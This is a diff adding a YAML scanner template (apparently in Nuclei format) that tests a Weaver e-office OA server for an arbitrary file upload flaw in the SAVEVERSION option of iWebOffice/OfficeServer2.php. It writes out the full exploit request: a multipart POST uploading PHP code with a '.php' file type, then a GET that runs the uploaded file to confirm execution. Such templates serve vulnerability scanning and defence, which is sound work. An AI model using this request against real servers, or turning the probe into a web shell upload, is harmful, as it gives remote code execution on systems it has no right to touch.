@@ -1,0 +1,70 @@
+id: poc-yaml-weaver-e-office-saveversion-anyfile-upload
+info:
+  name: 泛微OA e-office SAVEVERSION 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,e-office
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/iWebOffice/OfficeServer2.php'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
+    body: |-
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="RECORDID"
+
+      test
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="OPTION"
+
+      SAVEVERSION
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="FILETYPE"
+
+      .php
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"
+
+      <?=md5({{t1}});unlink(__FILE__);
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "VERSION"
+          - "FULPATH="
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - 'FULPATH=(.*?)[\n]'
+        internal: true
+      - type: dsl
+        name: decodefile
+        dsl:
+          - substr(base64_decode(file),30,35)
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - '{{BaseURL}}/attachment/{{decodefile}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
